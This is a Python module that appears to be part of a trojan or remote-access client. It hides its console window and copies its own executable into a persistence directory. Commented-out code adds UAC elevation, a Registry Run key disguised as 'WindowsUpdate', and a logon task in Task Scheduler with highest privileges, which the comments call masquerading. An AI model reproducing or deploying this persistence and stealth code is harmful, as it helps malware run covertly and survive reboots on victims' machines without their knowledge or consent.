import os
import sys
import ctypes
# Uncomment this section if you intend to use the shutil module.
# import shutil 
# import subprocess
from .constants import PERSISTENCE_DIRECTORY
# Needed when registering in the registry
# from winreg import SetValueEx, CreateKey, HKEY_CURRENT_USER, REG_SZ

class Persistence:
    def __init__(self):
        self.persistence_dir = PERSISTENCE_DIRECTORY
        if self.persistence_dir:
            try:
                os.makedirs(self.persistence_dir, exist_ok=True)
                os.chdir(self.persistence_dir)
                print(f"Client working directory set to '{self.persistence_dir}'.")
            except Exception as e:
                print(f"Failed to set working directory '{self.persistence_dir}': {e}. Program will terminate.")
                sys.exit(1)
    
    def _hide_console_window(self):
        if os.name == 'nt':
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                print("Console window has been hidden.")
            except Exception as e:
                print(f"Failed to hide console window: {e}")

    def _establish_persistence(self):
        if os.name == 'nt':
            try:
                current_exe_path = os.path.abspath(sys.argv[0])
                
                # -----------------------------------------------------------------
                # Used when the executable is not a standalone file and requires additional files or directories to run 
                # Retrieve the directory of the currently running executable.
                # current_exe_dir = os.path.dirname(current_exe_path)

                # Extract the folder name of the current executable’s directory.
                # folder_name = os.path.basename(current_exe_dir)

                # Build the destination path inside the Persistence directory
                # where the entire executable folder will be copied.
                # dest_dir = os.path.join(self.persistence_dir, folder_name)

                # if not os.path.exists(dest_dir):
                #     try:
                #         is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                #     except:
                #         is_admin = False

                #     if not is_admin:
                #         print("[*] Administrator privileges required. Requesting elevation...")

                #         params = " ".join([f'"{arg}"' for arg in sys.argv])
                #         ctypes.windll.shell32.ShellExecuteW(
                #             None, "runas", sys.executable, params, None, 1
                #         )
                #         sys.exit()

                #     try:
                #         shutil.copytree(current_exe_dir, dest_dir)
                #         print(f"[+] Successfully copied to: {dest_dir}")
                #     except Exception as e:
                #         print(f"[Error] Failed to copy directory: {e}")
                # else:
                #     print("[*] dest_dir already exists. No admin elevation needed.")
                # -----------------------------------------------------------------

                # -----------------------------------------------------------------
                # if the executable is a standalone file, use this method to copy just the .exe file
                # Path setup for copying the currently running file (current_exe_path) into the Persistence directory.
                exe_filename  = os.path.basename(current_exe_path)
                no_exe_name = os.path.splitext(exe_filename)[0]
                dest_folder = os.path.join(self.persistence_dir, no_exe_name)
                persistence_target_path = os.path.join(dest_folder, exe_filename)

                if not os.path.exists(dest_folder):
                    os.makedirs(dest_folder, exist_ok=True)

                # Option A (commented out): Use shutil.copy2 to copy the file while preserving metadata (e.g., timestamps).
                # Option B (active code): Manually copy the file in binary mode.
                # Use either method depending on your needs.
                if not os.path.exists(persistence_target_path):
                    # if you need admin rights to copy the file, uncomment below
                    # try:
                    #     is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                    # except:
                    #     is_admin = False

                    # if not is_admin:
                    #     print("[*] Administrator privileges required. Requesting elevation...")

                    #     params = " ".join([f'"{arg}"' for arg in sys.argv])
                    #     ctypes.windll.shell32.ShellExecuteW(
                    #         None, "runas", sys.executable, params, None, 1
                    #     )
                    #     sys.exit()
                    
                    # try:
                    #     shutil.copy2(current_exe_path, persistence_target_path)
                    #     print(f"[Persistence] Copied to '{persistence_target_path}' (Timestamp preserved).")
                    # except Exception as e:
                    #     print(f"[Error] Failed to copy directory: {e}")

                    with open(current_exe_path, 'rb') as src_file, \
                        open(persistence_target_path, 'wb') as dst_file:
                        dst_file.write(src_file.read())
                    print(f"[Persistence] '{current_exe_path}' has been copied to '{persistence_target_path}'.")
                else:
                    print(f"[Persistence] File '{persistence_target_path}' already exists. Skipping copy.")
                # -----------------------------------------------------------------

                # if you want to find the .exe file in the copied folder, uncomment below
                # exe_path = None

                # for root, dirs, files in os.walk(dest_dir):
                #     for file in files:
                #         if file.lower().endswith(".exe"):
                #             exe_path = os.path.join(root, file)
                #             break
                #     if exe_path:
                #         break

                # if not exe_path:
                #     print("[Error] Could not find any executable (.exe) files in the copied folder.")
                #     return False

                # Register in the Registry Run key
                # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
                # key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                # key_handle = CreateKey(HKEY_CURRENT_USER, key_path)
                # SetValueEx(key_handle, "WindowsUpdate", 0, REG_SZ, exe_path)
                # print("Registry Run key registration complete")

                # Register to Task Scheduler
                # task_name = "TroyCon" # Task name for masquerading (Disguise)

                # Check if the task is already registered
                # check_cmd = f'schtasks /query /tn "{task_name}"'
                # check_result = subprocess.run(check_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                # if check_result.returncode != 0:
                    # print(f"[*] Starting Task Scheduler registration: {task_name}")

                    # /rl HIGHEST: Run with highest privileges (Admin rights)
                    # /sc onlogon: Run automatically on user logon
                    # cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{exe_path}\\"" /sc onlogon /rl HIGHEST /f'
                    
                    # Execute command in the background without a console window
                    # subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    # print(f"[Persistence] Registered to Task Scheduler as '{task_name}'.")
                # else:
                    # print(f"[Persistence] Task is already registered in the Scheduler.")

            except Exception as e:
                print(f"[Error] Final persistence setup failed: {e}")

    def start(self):
        print("Initializing persistence mechanisms...")
        self._hide_console_window()
        self._establish_persistence()

